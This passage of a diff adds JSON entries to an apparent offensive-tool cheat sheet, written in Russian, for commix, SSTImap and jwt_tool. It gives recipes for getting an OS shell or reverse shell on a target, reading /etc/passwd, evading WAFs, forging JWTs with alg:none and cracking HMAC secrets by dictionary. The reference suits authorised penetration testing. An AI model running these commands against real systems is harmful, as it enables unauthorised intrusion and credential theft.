+            { "flag": "--os-cmd", "value": "'id'", "desc": "Выполнить одну команду ОС" },
+            { "flag": "--os-shell", "desc": "Интерактивный шелл ОС на цели" },
+            { "flag": "--alter-shell", "value": "Python", "desc": "Использовать альтернативный шелл (напр. Python)" },
+            { "flag": "--all", "desc": "Собрать всю доступную информацию о системе" },
+            { "flag": "--current-user", "desc": "Текущий пользователь ОС" },
+            { "flag": "--hostname", "desc": "Имя хоста системы" },
+            { "flag": "--is-root", "desc": "Проверить, root ли пользователь (Unix)" },
+            { "flag": "--is-admin", "desc": "Проверить права администратора (Windows)" },
+            { "flag": "--sys-info", "desc": "Сведения об ОС и системе" },
+            { "flag": "--file-read", "value": "/etc/passwd", "desc": "Прочитать файл с цели" },
+            { "flag": "--file-write", "value": "shell.sh", "desc": "Записать локальный файл на цель" }
+          ]
+        },
+        {
+          "name": "Обход WAF / Управление",
+          "flags": [
+            { "flag": "--tamper", "value": "space2ifs", "desc": "Обфускация нагрузок tamper-скриптами для обхода фильтров/WAF" },
+            { "flag": "--list-tampers", "desc": "Показать доступные tamper-скрипты" },
+            { "flag": "--skip-waf", "desc": "Пропустить определение WAF/IPS" },
+            { "flag": "--shellshock", "desc": "Тест на Shellshock (CVE-2014-6271) в CGI" },
+            { "flag": "--batch", "desc": "Не задавать вопросов — брать ответы по умолчанию" },
+            { "flag": "--delay", "value": "0", "desc": "Задержка между запросами, секунд" },
+            { "flag": "--flush-session", "desc": "Сбросить сохранённую сессию" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "commix -u {TARGET} --batch", "note": "Базовый детект командной инъекции" },
+        { "cmd": "commix -u {TARGET} --batch --os-shell", "note": "При успехе — интерактивный шелл ОС" },
+        { "cmd": "commix -r req.txt --batch --level 2", "note": "Запрос из файла с проверкой Cookie" },
+        { "cmd": "commix -u {TARGET} --batch --os-cmd 'id'", "note": "Выполнить одну команду без интерактива" }
+      ],
+      "notes": "Если найдена точка — сразу пробуй --os-shell. --technique сужает типы инъекций; classic даёт мгновенный вывод, time/file-based работают вслепую."
+    },
+    {
+      "title": "SSTImap / tplmap",
+      "subcategory": "Эксплуатация SSTI (шаблонизаторы)",
+      "purpose": "Находит и эксплуатирует Server-Side Template Injection в десятках движков (Jinja2, Twig, Freemarker, ERB и др.): от детекта до eval-кода, шелла ОС и работы с файлами.",
+      "install": "git clone https://github.com/vladko312/SSTImap && pip install -r SSTImap/requirements.txt",
+      "binary": "sstimap",
+      "target": "-u {TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Цель",
+          "flags": [
+            { "flag": "-u", "value": "{TARGET}", "desc": "Целевой URL" },
+            { "flag": "-r", "value": "req.txt", "desc": "Загрузить HTTP-запрос из файла" },
+            { "flag": "-d", "value": "'q=1'", "desc": "POST-данные" },
+            { "flag": "-c", "value": "'sid=...'", "desc": "HTTP Cookie" },
+            { "flag": "-H", "value": "'X-Api: 1'", "desc": "Свой HTTP-заголовок" },
+            { "flag": "--method", "value": "POST", "desc": "HTTP-метод запроса" },
+            { "flag": "-p", "value": "name", "desc": "Тестировать конкретный параметр" }
+          ]
+        },
+        {
+          "name": "Детект",
+          "flags": [
+            { "flag": "-e", "value": "Jinja2", "desc": "Принудительно указать движок шаблонов (--engine)" },
+            { "flag": "-t", "value": "render", "desc": "Техника детекта: render / blind (--technique)" },
+            { "flag": "-O", "value": "linux", "desc": "Принудительно указать ОС цели (--os)" },
+            { "flag": "-lvl", "value": "1", "desc": "Уровень интенсивности проверок (--level)" },
+            { "flag": "--crawl", "value": "1", "desc": "Краулить сайт и находить формы" },
+            { "flag": "--forms", "desc": "Находить и тестировать HTML-формы" }
+          ]
+        },
+        {
+          "name": "Запрос / Обход",
+          "flags": [
+            { "flag": "-A", "value": "'UA'", "desc": "Свой User-Agent (--user-agent)" },
+            { "flag": "--random-agent", "desc": "Случайный User-Agent" },
+            { "flag": "--proxy", "value": "http://127.0.0.1:8080", "desc": "HTTP-прокси" },
+            { "flag": "--tamper", "value": "script", "desc": "Tamper-скрипты для обфускации нагрузок" },
+            { "flag": "--force-overwrite", "desc": "Перезаписывать без безопасных ограничений" }
+          ]
+        },
+        {
+          "name": "Эксплуатация",
+          "flags": [
+            { "flag": "-x", "value": "'7*7'", "desc": "Выполнить код на языке шаблона (--eval)" },
+            { "flag": "-o", "value": "'id'", "desc": "Выполнить команду ОС (--os-cmd)" },
+            { "flag": "-s", "desc": "Интерактивный шелл ОС (--shell)" },
+            { "flag": "-i", "desc": "Интерактивный режим (--interactive)" },
+            { "flag": "-B", "value": "4444", "desc": "Bind-шелл на порту (--bind-shell)" },
+            { "flag": "-R", "value": "10.0.0.1:4444", "desc": "Reverse-шелл на {LHOST}:порт (--reverse-shell)" },
+            { "flag": "-X", "value": "local,remote", "desc": "Загрузить файл на цель (--upload)" },
+            { "flag": "-D", "value": "remote,local", "desc": "Скачать файл с цели (--download)" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "sstimap -u {TARGET}", "note": "Детект SSTI и автоопределение движка" },
+        { "cmd": "sstimap -u {TARGET} -p name -x '7*7'", "note": "Проверить eval в параметре name" },
+        { "cmd": "sstimap -u {TARGET} -s", "note": "При успехе — интерактивный шелл ОС" },
+        { "cmd": "sstimap -u {TARGET} -R {LHOST}:4444", "note": "Получить reverse-shell на свой хост" }
+      ],
+      "notes": "SSTImap — поддерживаемый форк tplmap (binary sstimap). Сначала просто запусти на URL — он сам распознает движок и предложит вектор."
+    },
+    {
+      "title": "jwt_tool",
+      "subcategory": "Анализ и атаки на JWT",
+      "purpose": "Швейцарский нож для JWT: разбор и тампер токенов, проверка типовых мисконфигов (alg:none, key confusion, null-signature), подбор слабого секрета и подпись своих токенов.",
+      "install": "git clone https://github.com/ticarpi/jwt_tool && pip install -r jwt_tool/requirements.txt",
+      "binary": "python3 jwt_tool.py",
+      "target": "{TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Цель / Токен",
+          "flags": [
+            { "flag": "", "value": "{TARGET}", "desc": "Сам JWT передаётся позиционным аргументом (токен для анализа/атаки)" },
+            { "flag": "-t", "value": "https://site/api", "desc": "URL для отправки токена и проверки реакции (--targeturl)" },
+            { "flag": "-rc", "value": "'jwt=...'", "desc": "Cookie, содержащие токен (--cookies)" },
+            { "flag": "-rh", "value": "'Authorization: Bearer ...'", "desc": "HTTP-заголовки запроса (--headers)" },
+            { "flag": "-pd", "value": "'data'", "desc": "POST-данные запроса (--postdata)" },
+            { "flag": "-cv", "value": "'Welcome'", "desc": "Канарейка: ожидаемый текст в успешном ответе (для авто-оценки)" }
+          ]
+        },
+        {
+          "name": "Сканирование",
+          "flags": [
+            { "flag": "-M", "value": "pb", "desc": "Режим сканирования (--mode): pb=playbook (типовые мисконфиги), at=все тесты, cc=фаззинг claim'ов, er=форсирование ошибок, cf=проверка конфигурации" }
+          ]
+        },
+        {
+          "name": "Эксплойты",
+          "flags": [
+            { "flag": "-X", "value": "a", "desc": "Тип атаки (--exploit): a=alg:none (обход подписи), n=key confusion RS/HS256, b=пустой пароль, s=null-signature, k=инъекция ключа в токен, i=инъекция inline-JWKS" },
+            { "flag": "-I", "desc": "Внедрить/изменить claim'ы в токене (с -pc/-pv для payload, -hc/-hv для header)" },
+            { "flag": "-pc", "value": "user", "desc": "Имя claim'а в payload (--pclaim)" },
+            { "flag": "-pv", "value": "admin", "desc": "Значение claim'а в payload (--pvalue)" },
+            { "flag": "-hc", "value": "kid", "desc": "Имя claim'а в header" },
+            { "flag": "-hv", "value": "../../x", "desc": "Значение claim'а в header" }
+          ]
+        },
+        {
+          "name": "Подпись / Ключи",
+          "flags": [
+            { "flag": "-S", "value": "hs256", "desc": "Алгоритм для пере-подписи токена (--sign): hs256/rs256/none и др." },
+            { "flag": "-k", "value": "key.pem", "desc": "Файл ключа (PEM) для подписи/проверки (--keyfile)" },
+            { "flag": "-p", "value": "secret", "desc": "Пароль/секрет для подписи или проверки (--password)" },
+            { "flag": "-T", "desc": "Тампер: изменить содержимое существующего токена (--tamper)" }
+          ]
+        },
+        {
+          "name": "Подбор / Проверка",
+          "flags": [
+            { "flag": "-C", "desc": "Подбор слабого HMAC-секрета по словарю (--crack)" },
+            { "flag": "-d", "value": "rockyou.txt", "desc": "Словарь для подбора секрета (--dict)" },
+            { "flag": "-V", "desc": "Проверить подпись токена заданным ключом (--verify)" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "python3 jwt_tool.py {TARGET}", "note": "Разобрать токен: показать header/payload и подсказки" },
+        { "cmd": "python3 jwt_tool.py {TARGET} -M pb -t https://site/api -rh 'Authorization: Bearer {TARGET}'", "note": "Playbook-скан мисконфигов прямо против сервиса" },
+        { "cmd": "python3 jwt_tool.py {TARGET} -X a", "note": "Атака alg:none — обход проверки подписи" },
+        { "cmd": "python3 jwt_tool.py {TARGET} -C -d rockyou.txt", "note": "Подобрать слабый HMAC-секрет по словарю" }
+      ],
+      "notes": "Бинарь запускается как python3 jwt_tool.py. Для отправки против цели нужен -t плюс место токена (-rc/-rh/-pd). -X задаёт конкретную атаку, -M — авто-скан."
+    }
+  ]
+}
